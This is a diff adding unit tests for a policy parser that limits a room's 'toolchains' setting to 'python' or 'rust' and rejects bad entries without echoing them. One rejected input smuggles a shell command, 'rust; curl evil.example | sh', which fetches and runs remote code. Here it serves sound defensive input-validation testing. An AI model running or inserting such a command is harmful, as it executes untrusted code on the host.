@@ -20,6 +20,10 @@ import {
   NETWORK_HOST_DUPLICATE,
   NETWORK_HOST_INVALID,
   RESULT_TOOL,
+  TOOLCHAIN_DUPLICATE,
+  TOOLCHAIN_NEEDS_SHELL,
+  TOOLCHAIN_UNKNOWN,
+  TOOLCHAINS,
   type Decision,
   type RunBinding,
 } from "../src/core/policy.js";
@@ -536,6 +540,78 @@ describe("a room's network: exact host names, for Runner's egress proxy", () => 
   });
 });
 
+describe("a room's toolchains (the owner's ruling of 2026-11-20)", () => {
+  const SHELL = [...DEFAULT_TOOLS, "shell"];
+  const withChains = (toolchains: unknown, tools: unknown = SHELL) => config([room({ extra: { tools, toolchains } })]);
+
+  it("are optional and empty by default, so a room without them runs as before", () => {
+    const parsed = parsePolicyConfig(config());
+    expect(parsed.ok && parsed.value.rooms[0].toolchains).toEqual([]);
+    expect(decide().facts?.toolchains).toEqual([]);
+    expect(parsePolicyConfig(withChains([])).ok).toBe(true);
+  });
+
+  it("allow exactly rust and python, in any order, and hand the run its sorted list", () => {
+    expect(TOOLCHAINS).toEqual(["python", "rust"]);
+    expect(decide({ config: withChains(["rust"]) }).facts?.toolchains).toEqual(["rust"]);
+    expect(decide({ config: withChains(["python"]) }).facts?.toolchains).toEqual(["python"]);
+    const both = decide({ config: withChains(["rust", "python"]) });
+    expect(both.outcome).toBe("run");
+    expect(both.facts?.toolchains).toEqual(["python", "rust"]);
+    // As the owner wrote them in the parsed policy; sorted only as a run fact.
+    const parsed = parsePolicyConfig(withChains(["rust", "python"]));
+    expect(parsed.ok && parsed.value.rooms[0].toolchains).toEqual(["rust", "python"]);
+    // No registry is added: the network is the room's own list.
+    expect(both.facts?.network).toEqual([]);
+  });
+
+  const unknown: [string, unknown][] = [
+    [".NET, not yet a toolchain", "dotnet"],
+    ["an upper-case name", "Rust"],
+    ["a version suffix", "rust@1.100"],
+    ["white space", " rust"],
+    ["text meant for a shell", "rust; curl evil.example | sh"],
+    ["a number", 1],
+    ["null", null],
+    ["an object", { name: "rust" }],
+  ];
+  it.each(unknown)("refuses %s at load with toolchain_unknown, naming the room and the entry's index, never its text", (_what, entry) => {
+    const at = `rooms[].toolchains:${TOOLCHAIN_UNKNOWN}:${ROOM}:1`;
+    expect(parsePolicyConfig(withChains(["rust", entry]))).toEqual({ ok: false, at });
+    const problem = policyProblem(at);
+    expect(problem).toBe(`entry 1 of the room ${ROOM}'s rooms[].toolchains isn't a toolchain Runner has (toolchain_unknown): list only "python" or "rust"`);
+    expect(problem).not.toMatch(/curl|dotnet|@1\.100|Rust| rust|null|\{/);
+    expect(decide({ config: withChains([entry]) })).toMatchObject({ outcome: "refuse", reason: "config_invalid" });
+  });
+
+  it("refuses a repeated toolchain with toolchain_duplicate, at its index", () => {
+    const at = `rooms[].toolchains:${TOOLCHAIN_DUPLICATE}:${ROOM}:2`;
+    expect(parsePolicyConfig(withChains(["rust", "python", "rust"]))).toEqual({ ok: false, at });
+    expect(policyProblem(at)).toBe(`entry 2 of the room ${ROOM}'s rooms[].toolchains repeats a toolchain already listed (toolchain_duplicate)`);
+  });
+
+  it("refuses a list that isn't one, or is too long to read", () => {
+    expect(parsePolicyConfig(withChains("rust"))).toEqual({ ok: false, at: "rooms[].toolchains" });
+    expect(parsePolicyConfig(withChains({ 0: "rust" }))).toEqual({ ok: false, at: "rooms[].toolchains" });
+    expect(parsePolicyConfig(withChains(Array.from({ length: 17 }, () => "rust")))).toEqual({ ok: false, at: "rooms[].toolchains" });
+  });
+
+  it("refuses toolchains in a room without the shell, the only tool that can run them", () => {
+    const at = `rooms[].toolchains:${TOOLCHAIN_NEEDS_SHELL}:${ROOM}`;
+    expect(parsePolicyConfig(withChains(["python"], DEFAULT_TOOLS))).toEqual({ ok: false, at });
+    expect(parsePolicyConfig(config([room({ extra: { toolchains: ["python"] } })]))).toEqual({ ok: false, at });
+    expect(policyProblem(at)).toBe(`the room ${ROOM} lists rooms[].toolchains without "shell" in rooms[].tools, and only the shell can run a toolchain (toolchain_needs_shell)`);
+    expect(parsePolicyConfig(withChains([], DEFAULT_TOOLS)).ok).toBe(true);
+  });
+
+  it("keeps each room's toolchains to that room", () => {
+    const other = { ...room({ extra: { tools: SHELL } }), room_id: "room_2" };
+    const cfg = config([room({ extra: { tools: SHELL, toolchains: ["rust"] } }), other]);
+    expect(decide({ config: cfg }).facts?.toolchains).toEqual(["rust"]);
+    expect(decide({ config: cfg, task: { id: TASK, workspace_id: "room_2" } }).facts?.toolchains).toEqual([]);
+  });
+});
+
 describe("the facts handed to step 9's adapter", () => {
   it("names the tools, network, workspace, caps and result tool, and adds shell only when listed", () => {
     const d = decide({ config: config([room({ extra: { tools: ["read", "edit", "shell"] } })]) });
@@ -655,6 +731,7 @@ describe("the deep review of #455, ruled 2026-11-18", () => {
       ["output tokens raised", config([room()], { caps: { ...CAPS, output_tokens: 50_001 } })],
       ["outputs shared", config([room({ extra: { outputs: "share" } })])],
       ["a network host added", config([room({ extra: { network: ["registry.npmjs.org"] } })])],
+      ["a toolchain added", config([room({ extra: { tools: [...DEFAULT_TOOLS, "shell"], toolchains: ["rust"] } })])],
       ["workspace root moved", config([room()], { workspace_root: "/Users/owner/elsewhere" })],
     ];
     for (const [what, cfg] of widened) {
